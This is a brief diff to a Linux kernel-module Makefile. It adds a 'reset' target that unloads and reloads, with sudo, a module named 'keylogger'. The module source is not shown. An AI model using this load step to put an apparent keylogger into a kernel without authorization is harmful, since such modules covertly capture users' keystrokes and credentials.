@@ -15,5 +15,7 @@ default:
 
 clean:	
 	$(MAKE) -C $(KERNELDIR) M=$(PWD) clean
+reset:
+	sudo rmmod -v keylogger; make && sudo insmod keylogger.ko
 
 endif
